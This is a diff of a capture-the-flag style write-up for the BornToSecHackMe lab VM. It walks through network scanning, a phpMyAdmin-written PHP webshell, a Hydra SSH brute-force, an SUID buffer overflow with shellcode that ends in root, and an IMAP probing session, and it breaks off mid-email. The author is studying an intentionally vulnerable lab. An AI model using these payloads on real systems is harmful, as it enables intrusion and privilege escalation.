@@ -8,7 +8,7 @@
 
 
 I launched the machine and made a scan on my local network:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ nmap 192.168.56.3/24
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 16:50 CEST
@@ -52,7 +52,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1123.69 seconds
 ```
 and discovered this IP:
 ![[Pasted image 20240417165322.png]]
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ nmap -sC -sV 192.168.56.101
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 17:09 CEST
@@ -244,8 +244,7 @@ Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]
 
 With the following credentials:
 ```
-lmezard
-!q\]Ej?*5K5cy*AJ
+lmezard:!q\]Ej?*5K5cy*AJ
 ```
 I could accede to the forum:
 ![[Pasted image 20240418125614.png]]
@@ -274,7 +273,7 @@ allow us to accede to the phpMyAdmin page:
 We have then access to a database in which information about users is stored:
 ![[Pasted image 20240422160109.png]]
 
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ cat forum
 ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28
@@ -292,10 +291,15 @@ However, I can't identify the kind of hashing..
 
 Usually MySQL5 Hash follows this pattern:
 ![[Pasted image 20240422164245.png]]
-But it doesn't seem to be the case now.
+But it doesn't seem to be the case.
 
-By following this [guide](https://medium.com/@959652664/summary-and-analysis-of-penetration-testing-based-on-phpmyadmin-784896851cf9), to make MySQL execute commands like the following one:
-```
+In the "Variables" tab:
+![[Pasted image 20240511172423.png]]
+we can find the version of the PHPMyAdmin server:
+![[Pasted image 20240511172400.png]]
+
+By following this [guide](https://medium.com/@959652664/summary-and-analysis-of-penetration-testing-based-on-phpmyadmin-784896851cf9), to make MySQL execute commands like the following one (it appears we have writing permissions in the directory `/var/www/forum/templates_c`):
+```mysql
 select "<html> <body> <form method='GET' name='<?php echo basename($_SERVER['PHP_SELF']); ?>'> <input type='TEXT' name='cmd' id='cmd' size='80'> <input type='SUBMIT' value='Execute'> </form> <pre> <?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body> <script>document.getElementById('cmd').focus();</script> </html>" into outfile "/var/www/forum/templates_c/test.php"
 ```
 ![[Pasted image 20240423142613.png]]
@@ -305,8 +309,15 @@ select "<html> <body> <form method='GET' name='<?php echo basename($_SERVER['PHP
 And we can find a webshell at [this address](https://192.168.56.101/forum/templates_c/test.php):
 ![[Pasted image 20240423142903.png]]
 
-Typing:
+At the same time, by inserting and executing th code snippet:
+```mysql
+select "<?php phpinfo();?>" into outfile "/var/www/forum/templates_c/intrusive.php"
 ```
+we have access to:
+![[Pasted image 20240511175308.png]]
+
+Typing:
+```shell
 cd /home/LOOKATME && cat password
 lmezard:G!@M6f4Eatau{sF"
 
@@ -330,10 +341,10 @@ find / -perm -003 -type d 2>/dev/null # 4 for r, 2 for w, 1 for x
 find / -user www-data 2>/dev/null
 ```
 
-I think we have to follow the steps of the anonymous user that left a trail of bread crumbs...
+I think we have to follow the steps of the anonymous user who left a trail of bread crumbs...
 
 Let's try to connect via FTP:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ ftp lmezard@192.168.56.101
 Connected to 192.168.56.101.
@@ -367,7 +378,7 @@ ftp>
 ```
 
 We obtain two files:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ cat README
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
@@ -385,7 +396,7 @@ fun: POSIX tar archive (GNU)
 BJPCP.pcap:572:int main() {
 ```
 We find a `main()` function:
-```
+```c
 int main() {
         printf("M");
         printf("Y");
@@ -420,7 +431,7 @@ int main() {
 }
 ```
 we look for the function `getme1()` now:
-```
+```shell
 ┌──(fab㉿kali)-[~/ft_fun]
 └─$ grep -rn getme1
 BJPCP.pcap:278:char getme10() {
@@ -457,7 +468,7 @@ APM1E.pcap:3://file6
 And so on. Starting from `getme8()` the letters are in clear text.
 
 Until we have:
-```
+```shell
 ┌──(fab㉿kali)-[~/ft_fun]
 └─$ echo -n Iheartpwnage > password
 
@@ -474,7 +485,7 @@ laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
 
 And we can connect via SSH:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ ssh laurie@192.168.56.101
         ____                _______    _____
@@ -543,7 +554,7 @@ bomb                                                                            
 ```
 
 It seems that we have to pass six tests: 
-```
+```c
 int main(int argc,char **argv)
 {
   char *pcVar1;
@@ -597,7 +608,7 @@ int main(int argc,char **argv)
 ```
 
 The first test simply asks us to enter a string:
-```
+```c
 void phase_1(char *param_1)
 {
   int iVar1;
@@ -610,10 +621,10 @@ void phase_1(char *param_1)
 }
 ```
 
-The program uses the function `readline()` to retrieve ou string.
+The program uses the function `readline()` to retrieve our string.
 
 This time we have to enter a string with 7 numbers in increasing order and respecting a certain condition:
-```
+```c
 stack[1] must be equal to 1
 iVar1 = 1;
 stack[2] must be equal to 2 * stack[1] // 2
@@ -630,7 +641,7 @@ stack[6] must be equal to 6 * stack[5] // 720
 ```
 
 Our string will be parsed by a [`sscanf()`](https://linux.die.net/man/3/sscanf):
-```
+```c
 void read_six_numbers(char *param_1,int param_2)
 {
   int iVar1;
@@ -664,8 +675,8 @@ void phase_2(char *param_1)
 }
 ```
 
-For the following test I typed "0 q 777":
-```
+For the following test I typed "0 q 777" (however, various solutions are possible):
+```c
 void phase_3(char *param_1)
 {
   int iVar1;
@@ -740,7 +751,7 @@ void phase_3(char *param_1)
 
 For the next test, `iVar1` should be equal to 55 after the operation.
 For the record, `sscanf()` returns the number of matches found and assigned:
-```
+```c
 int func4(int param_1)
 {
   int iVar1;
@@ -775,7 +786,7 @@ void phase_4(char *param_1)
 ```
 
 I tested with a program coded for this purpose:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ ./a.out 9
 1 9
@@ -836,7 +847,7 @@ s -> 1
 ```
 
 The result of the AND operation is converted to a `char` before being used to dereference the array:
-```
+```c
 void phase_5(char *param_1)
 {
   int iVar1;
@@ -865,6 +876,72 @@ void phase_5(char *param_1)
 
 
 
+And finally the function `phase_6`:
+```c
+void phase_6(char *param_1)
+{
+  int *piVar1;
+  int iVar2;
+  int *piVar3;
+  int iVar4;
+  undefined1 *local_38;
+  int *local_34 [6];
+  int local_1c [6];
+  
+  local_38 = node1;
+  read_six_numbers(param_1,(int)local_1c);
+  iVar4 = 0;
+  do {
+    iVar2 = iVar4;
+    if (5 < local_1c[iVar4] - 1U) {
+      explode_bomb();
+    }
+    while (iVar2 = iVar2 + 1, iVar2 < 6) {
+      if (local_1c[iVar4] == local_1c[iVar2]) {
+        explode_bomb();
+      }
+    }
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 6);
+  iVar4 = 0;
+  do {
+    iVar2 = 1;
+    piVar3 = (int *)local_38;
+    if (1 < local_1c[iVar4]) {
+      do {
+        piVar3 = (int *)piVar3[2];
+        iVar2 = iVar2 + 1;
+      } while (iVar2 < local_1c[iVar4]);
+    }
+    local_34[iVar4] = piVar3;
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 6);
+  iVar4 = 1;
+  piVar3 = local_34[0];
+  do {
+    piVar1 = local_34[iVar4];
+    piVar3[2] = (int)piVar1;
+    iVar4 = iVar4 + 1;
+    piVar3 = piVar1;
+  } while (iVar4 < 6);
+  piVar1[2] = 0;
+  iVar4 = 0;
+  do {
+    if (*local_34[0] < *(int *)local_34[0][2]) {
+      explode_bomb();
+    }
+    local_34[0] = (int *)local_34[0][2];
+    iVar4 = iVar4 + 1;
+  } while (iVar4 < 5);
+  return;
+}
+```
+
+
+
+
+
+
 
 
 
@@ -882,20 +959,33 @@ opuKMA
 
 We now have a list of the possible results, and we will use [Hydra](https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial) to bruteforce the SSH service with this wordlist:
 
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ hydra -l thor -p wordlist.txt 192.168.56.101 ssh
 <SNIP>
 
 ```
 
-
 Our credentials are:
 ```
 thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
-and we can connect via SSH as user thor:
+
+what's confirmed by the given hints:
 ```
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+and we can connect via SSH as user thor:
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ ssh thor@192.168.56.101
         ____                _______    _____
@@ -926,7 +1016,7 @@ thor@BornToSecHackMe:~$
 
 `turtle` is an ASCII text file containing a series of instructions that, translated into "[turtle](https://pythonsandbox.com/turtle) code" lead to the word "SLASH":
 ![[pythonsandbox-canvas.png]]
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ file turtle
 turtle: ASCII text
@@ -953,7 +1043,7 @@ I was like "digest"? What does ["message digest"](https://www.techopedia.com/def
 "A message digest is a cryptographic hash function containing a string of digits created by a one-way hashing formula."
 
 After having tried to hash the word "SLASH" with `sha1sum` and `sha256sum`, we tried `md5sum` and got it:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ echo -n SLASH > slash.txt
 
@@ -969,8 +1059,8 @@ So we have:
 ```
 zaz:646da671ca01bb5d84dbb5fb2238dc8e
 ```
-and we can `su zaz`:
-```
+and we can run `su zaz`:
+```shell
 thor@BornToSecHackMe:~$ su zaz
 Password:
 zaz@BornToSecHackMe:~$
@@ -979,7 +1069,7 @@ zaz@BornToSecHackMe:~$
 ### A Buffer Overflow
 
 The executable file we find has an SUID and an SGID:
-```
+```shell
 zaz@BornToSecHackMe:~$ ls -la
 total 12
 drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
@@ -997,7 +1087,7 @@ exploit_me: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYS
 zaz@BornToSecHackMe:~$
 ```
 
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ scp zaz@192.168.56.101:/home/zaz/exploit_me ./
         ____                _______    _____
@@ -1016,7 +1106,7 @@ exploit_me                                                                      
 ```
 
 We probably have to make a buffer overflow, since there's a `puts()` function waiting for an input and a totally useless `main()` function:
-```
+```shell
 bool main(int param_1,int param_2)
 {
   char local_90 [140];
@@ -1035,7 +1125,7 @@ Since the LibC is used, we can maybe make the program [call a function](https://
 Among the tools available by default on Linux to analyze an executable, we have `readelf`, `objdumps`, `nm`, `gdb`, `dmesg`.. Please refer to this [write-up](https://jaybailey216.com/pwn-challenge-bat-computer) to see some of these tools at work.
 
 To create a buffer overflow we can use Python:
-```
+```shell
 ./exploit_me $(python -c "print '\x90'*37+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*100 +'\xb0\xf6\xff\xbf'")
 ```
 
@@ -1044,7 +1134,7 @@ However, for this challenge we will use Perl.
 To understand what to do, we will use [PEDA](https://github.com/longld/peda), which stands for Python Exploit Development Assistance for GDB.
 
 We launch our executable and we test it with a line of 'A' longer than 140 characters, the size of the `local_90` buffer:
-```
+```shell
 ┌──(fab㉿kali)-[~/rainfall/b2r]
 └─$ gdb exploit_me
 ```
@@ -1056,7 +1146,7 @@ We see that the EBP register contains the hexadecimal string 0x41414141, (four t
 Our goal is to enter malicious code into the EIP register.
 
 We try to make the program crash with a random string of 200 characters:
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ msf-pattern_create -l 200
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
@@ -1068,7 +1158,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 ![[Pasted image 20240425141610.png]]
 
 We calculate the offset towards EIP, by taking the string contained in EIP ("6Ae7"):
-```
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ msf-pattern_offset -q 6Ae7
 [*] Exact match at offset 140
@@ -1079,7 +1169,7 @@ We calculate the offset towards EIP, by taking the string contained in EIP ("6Ae
 We need to pad our input with 140 characters before adding our shellcode that will be written on the memory (for understanding how to create a shellcode, refer to [this link](https://www.arsouyes.org/blog/2019/54_Shellcode/index.en.html), and [here](http://shell-storm.org/shellcode/index.html) is a large corpus of shellcodes).
 
 However, we need to find the address of the ESP where a pointer to the previous instruction is stored:
-```
+```shell
 gdb-peda$ run `perl -e 'print "A"x140'`
 <SNIP>
 
@@ -1105,14 +1195,14 @@ It doesn't work, but it doesn't matter, because:
 I had it work by slightly modifying my command and by adding a different shellcode, found [here](https://pointerless.wordpress.com/2012/02/26/strcpy-security-exploit-how-to-easily-buffer-overflow).
 
 For a start, I made the program crash and ran the `dmesg` command to find the address of the ESP:
-```
+```shell
 zaz@BornToSecHackMe:~$ dmesg | tail -1
 [21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
 zaz@BornToSecHackMe:~$
 ```
 ![[Pasted image 20240425154932.png]]
 And then I smashed it:
-```
+```shell
 zaz@BornToSecHackMe:~$ dmesg | tail -1
 [21309.218795] exploit_me[18468]: segfault at 46b0c031 ip 46b0c031 sp bffff6b0 error 14
 zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . "\xb0\xf6\xff\xbf" . "\x90"x35 . "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB\x16\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08\x89\x43\x0C\xB0\x0B\x8D\x4B\x08\x8D\x53\x0C\xCD\x80\xE8\xE5\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"'`
@@ -1126,8 +1216,8 @@ And I'm root!
 
 
 
-In a folder named `mail/.imap/` we find some [Dovecot logs](https://doc.dovecot.org/admin_manual/logging), with detailed error messages:
-```
+In the home directory of zaz, in a folder named `mail/.imap/` we find some [Dovecot](https://www.dovecot.org)[logs](https://doc.dovecot.org/admin_manual/logging) with what resembles to an error message (the [Internet Message Access Protocol](https://www.cloudflare.com/learning/email-security/what-is-imap) is a protocol allowing access to an e-mail account, while [Simple Mail Transfer Protocol](https://www.cloudflare.com/learning/email-security/what-is-smtp) is a technical standard for transmitting electronic mail over a network):
+```shell
 zaz@BornToSecHackMe:~/mail/.imap$ ls -la
 total 1
 drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .
@@ -1136,22 +1226,321 @@ drwxr-x--- 3 zaz zaz 107 Oct  8  2015 ..
 drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Drafts
 drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Sent
 drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Trash
+zaz@BornToSecHackMe:~/mail/.imap$ cat INBOX.Drafts/dovecot.index.log
+(��V��V����@���mbox���� ��V�'��V�Y9�K|���� ��V���� @�zaz@BornToSecHackMe:~/mail/.imap$ pwd
+/home/zaz/mail/.imap
+zaz@BornToSecHackMe:~/mail/.imap$ cat dovecot.mailbox.log
+�v�}<~�q��~�&V�
+9�oh�P`V�!�RCN�j�6i��0V�zaz@BornToSecHackMe:~/mail/.imap$
+```
+
+In a folder named `mail/.imap/` we find some [Dovecot logs](https://doc.dovecot.org/admin_manual/logging), with detailed error messages:
+```shell
+zaz@BornToSecHackMe:~/mail/.imap$ ls -la
+total 1
+drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .
+drwxr-x--- 3 zaz zaz 107 Oct  8  2015 ..
+-rwxr-x--- 1 zaz zaz  72 Oct  8  2015 dovecot.mailbox.log
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Drafts
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Sent
+drwxr-x--- 2 zaz zaz  40 Oct  8  2015 INBOX.Trash
+zaz@BornToSecHackMe:~/mail/.imap$ cat INBOX.Drafts/dovecot.index.log
+(��V��V����@���mbox���� ��V�'��V�Y9�K|���� ��V���� @�zaz@BornToSecHackMe:~/mail/.imap$ pwd
+/home/zaz/mail/.imap
+zaz@BornToSecHackMe:~/mail/.imap$ cat dovecot.mailbox.log
+�v�}<~�q��~�&V�
+9�oh�P`V�!�RCN�j�6i��0V�zaz@BornToSecHackMe:~/mail/.imap$
+```
+
+Something is going on here... Let's investigate.
+
+To read the logs I need the command [`doveadm log`](https://doc.dovecot.org/3.0/man/doveadm-log.1), the utility `doveadm` being of course installed in the host machine:
+```shell
+zaz@BornToSecHackMe:~/mail/.imap$ doveadm
+usage: doveadm [-Dv] [-f <formatter>] <command> [<args>]
+
+  altmove      [-u <user>|-A] [-S <socket_path>] [-r] <search query>
+  auth         [-a <auth socket path>] [-x <auth info>] <user> [<password>]
+  config       [doveconf parameters]
+  director     add|dump|flush|map|move|remove|ring|status
+  dump         [-t <type>] <path>
+  expunge      [-u <user>|-A] [-S <socket_path>] <search query>
+  fetch        [-u <user>|-A] [-S <socket_path>] <fields> <search query>
+  force-resync [-u <user>|-A] [-S <socket_path>] <mailbox>
+  help         <cmd>
+  import       [-u <user>|-A] [-S <socket_path>] <source mail location> <dest parent mailbox> <search query>
+  index        [-u <user>|-A] [-S <socket_path>] <mailbox mask>
+  kick         [-a <anvil socket path>] [-f] <user mask>[|]<ip/bits>
+  log          find|reopen|test
+  mailbox      create|delete|list|mutf7|rename|status|subscribe|unsubscribe
+  move         [-u <user>|-A] [-S <socket_path>] <destination> <search query>
+  penalty      [-a <anvil socket path>] [<ip/bits>]
+  proxy        kick|list
+  purge        [-u <user>|-A] [-S <socket_path>]
+  pw           [-l] [-p plaintext] [-r rounds] [-s scheme] [-u user] [-V]
+  reload
+  search       [-u <user>|-A] [-S <socket_path>] <search query>
+  sis          deduplicate|find
+  stop
+  user         [-a <userdb socket path>] [-x <auth info>] [-f field] <user mask> [...]
+  who          [-a <anvil socket path>] [-1] [<user mask>] [<ip/bits>]
+zaz@BornToSecHackMe:~/mail/.imap$ doveadm mailbox list
+INBOX.Drafts
+INBOX.Sent
+INBOX.Trash
+zaz@BornToSecHackMe:~/mail/.imap$ doveadm auth -a /var/run/dovecot/master.pid zaz
+Password:
+doveadm(zaz): Error: auth: connect(/var/run/dovecot/master.pid) failed: Permission denied (euid=1005(zaz) egid=1005(zaz) missing +r perm: /var/run/dovecot/master.pid, dir owned by 0:0 mode=0755)
+zaz@BornToSecHackMe:~/mail/.imap$ doveadm log find .
+Looking for log files from .
+Debug: Not found
+Info: Not found
+Warning: Not found
+Error: Not found
+Fatal: Not found
+zaz@BornToSecHackMe:~/mail/.imap$ ls
+dovecot.mailbox.log  INBOX.Drafts  INBOX.Sent  INBOX.Trash
+zaz@BornToSecHackMe:~/mail/.imap$ doveadm log find ./INBOX.Drafts
+Looking for log files from ./INBOX.Drafts
+Debug: Not found
+Info: Not found
+Warning: Not found
+Error: Not found
+Fatal: Not found
+zaz@BornToSecHackMe:~/mail/.imap$ file dovecot.mailbox.log
+dovecot.mailbox.log: X11 SNF font data, LSB first
 zaz@BornToSecHackMe:~/mail/.imap$
 ```
+Nothing to be found ([X11](https://nwalsh.com/comp.fonts/FAQ/cf_94.htm) is a font).
 
+Maybe zaz has valid credentials to connect via [IMAP](https://www.atmail.com/blog/imap-commands) ([here](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet) is another command list):
+```shell
+┌──(fab㉿kali)-[~]
+└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
+Can't use SSL_get_servername
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify return:1
+. OK Pre-login capabilities listed, post-login capabilities have more.
+A1 login zaz 646da671ca01bb5d84dbb5fb2238dc8e
+* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
+A1 OK Logged in
+A2 LIST "" "*"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Sent"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
+* LIST (\HasNoChildren) "/" "INBOX"
+A2 OK List completed.
+A3 EXAMINE INBOX.Drafts
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1444339880] UIDs valid
+* OK [UIDNEXT 1] Predicted next UID
+* OK [HIGHESTMODSEQ 1] Highest
+A3 OK [READ-ONLY] Select completed.
+A3 EXAMINE INBOX.Sent
+* OK [CLOSED] Previous mailbox closed.
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1444339881] UIDs valid
+* OK [UIDNEXT 1] Predicted next UID
+* OK [HIGHESTMODSEQ 1] Highest
+A3 OK [READ-ONLY] Select completed.
+A3 EXAMINE INBOX.Trash
+* OK [CLOSED] Previous mailbox closed.
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 0 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1444339871] UIDs valid
+* OK [UIDNEXT 1] Predicted next UID
+* OK [HIGHESTMODSEQ 1] Highest
+A3 OK [READ-ONLY] Select completed.
 
+```
+I could log in! Hoever, I didn't find any message in the inbox...
 
-[IMAP commands](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet)
-[commands](https://www.atmail.com/blog/imap-commands)
-[Hacking IMAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap):
+I decided to download the files on my session to open them from there:
 ```
 ┌──(fab㉿kali)-[~]
-└─$ telnet 192.168.56.101 143
-Trying 192.168.56.101...
-Connected to 192.168.56.101.
-Escape character is '^]'.
-* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE STARTTLS LOGINDISABLED] Dovecot ready.
+└─$ scp zaz@192.168.56.101:/home/zaz/mail/.imap/INBOX.Drafts/dovecot.index.log ./
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
 
+                       Good luck & Have fun
+zaz@192.168.56.101's password:
+dovecot.index.log                                                                     100%  148    68.9KB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$ scp zaz@192.168.56.101:/home/zaz/mail/.imap/dovecot.mailbox.log ./
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+zaz@192.168.56.101's password:
+dovecot.mailbox.log                                                                   100%   72    25.3KB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$
+```
+
+To do that I had to install Dovecot on my session, for which I needed to:
+- download a [release](https://www.dovecot.org/download);
+- launch:
+```shell
+$ cd ~/dovecot
+$ ./configure
+$ make
+$ sudo make install
+```
+- add a [script](https://doc.dovecot.org/installation_guide/startup_scripts/sample_dovecot_init.d_script) to the `/etc/init.d` directory;
+- launch the `~/dovecot/doc/mkcert.sh` script to create a [certificate](https://doc.dovecot.org/admin_manual/ssl/certificate_creation) (I had to modify the path of the `~/dovecot/doc/dovecot-openssl.cnf` file);
+- [create unprivileged users](https://doc.dovecot.org/configuration_manual/howto/simple_virtual_install) **dovecot** and **dovenull** if they don’t exist yet ([without password](https://unix.stackexchange.com/questions/56765/creating-a-user-without-a-password)).
+
+Finally I could type:
+```shell
+┌──(fab㉿kali)-[~/dovecot-2.3.21]
+└─$ sudo service dovecot restart
+Restarting Dovecot.
+
+┌──(fab㉿kali)-[~/dovecot-2.3.21]
+└─$ sudo doveadm reload
+
+```
+
+But I don't seem to be able to read them with this method...
+```shell
+┌──(fab㉿kali)-[~]
+└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
+Can't use SSL_get_servername
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify return:1
+. OK Pre-login capabilities listed, post-login capabilities have more.
+A1 login thor Publicspeakingisveryeasy.126241207201b2149opekmq426135
+* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
+A1 OK Logged in
+A2 LIST "" "*"
+* LIST (\HasNoChildren) "/" "INBOX"
+A2 OK List completed.
+
+```
+I tried to connect to IMAP server with users such as `thor` and `laurie` (couldn't connect as `lmezard` because of bad characters in the password) but their inbox is empty.
+
+When I connected as `laurie@borntosec.net`, however, I discovered they sent the mails they had received from `qudevide@mail.borntosec.net` to user `ft_root`, and that's suspect:
+```shell
+┌──(fab㉿kali)-[~]
+└─$ openssl s_client -connect 192.168.56.101:143 -starttls imap -crlf -quiet
+Can't use SSL_get_servername
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 O = Dovecot mail server, OU = localhost, CN = localhost, emailAddress = root@mail.borntosec.net
+verify return:1
+. OK Pre-login capabilities listed, post-login capabilities have more.
+A1 login laurie@borntosec.net !q\]Ej?*5K5cy*AJ
+* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS MULTIAPPEND UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS
+A1 OK Logged in
+A2 list
+A2 BAD Error in IMAP command LIST: Invalid reference.
+A2 LIST
+A2 BAD Error in IMAP command LIST: Invalid reference.
+A2 LIST "" "*"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Drafts"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Sent"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX.Trash"
+* LIST (\NoInferiors \UnMarked) "/" "INBOX"
+A2 OK List completed.
+A3 EXAMINE INBOX.Sent
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS ()] Read-only mailbox.
+* 2 EXISTS
+* 2 RECENT
+* OK [UIDVALIDITY 1444339365] UIDs valid
+* OK [UIDNEXT 3] Predicted next UID
+* OK [HIGHESTMODSEQ 1] Highest
+A3 OK [READ-ONLY] Select completed.
+a4 FETCH 1 BODY[]
+* 1 FETCH (BODY[] {1722}
+Received: from 192.168.1.22
+        (SquirrelMail authenticated user laurie@borntosec.net)
+        by 192.168.1.8 with HTTP;
+        Thu, 8 Oct 2015 23:22:45 +0200
+Message-ID: <38e4cbc743bb95cd2402bf0bc47602b3.squirrel@192.168.1.8>
+Date: Thu, 8 Oct 2015 23:22:45 +0200
+Subject: Very interesting !!!!
+From: laurie@borntosec.net
+To: ft_root@mail.borntosec.net
+User-Agent: SquirrelMail/1.4.22
+MIME-Version: 1.0
+Content-Type: text/plain;charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+X-Priority: 3 (Normal)
+Importance: Normal
+
+WinDev est un atelier de g�nie logiciel (AGL) �dit� par la soci�t�
+fran�aise PC SOFT et con�u pour d�velopper des applications,
+principalement orient�es donn�es pour Windows 8, 7, Vista, XP, 2008, 2003,
+2000, mais �galement pour Linux, .Net et Java. Il propose son propre
+langage, appel� le WLangage. La premi�re version de l'AGL est sortie en
+1993. Apparent� � WebDev et WinDev Mobile.
+
+La communaut� autour de WinDev
+Tour De France Technique
+Chaque ann�e, entre le mois de mars et le mois de mai, PC SOFT organise
+dans toute la France ce qu'ils appellent le TDF Tech (Tour De France
+Technique). Cet �v�nement d'une demi-journ�e a pour but d'informer et de
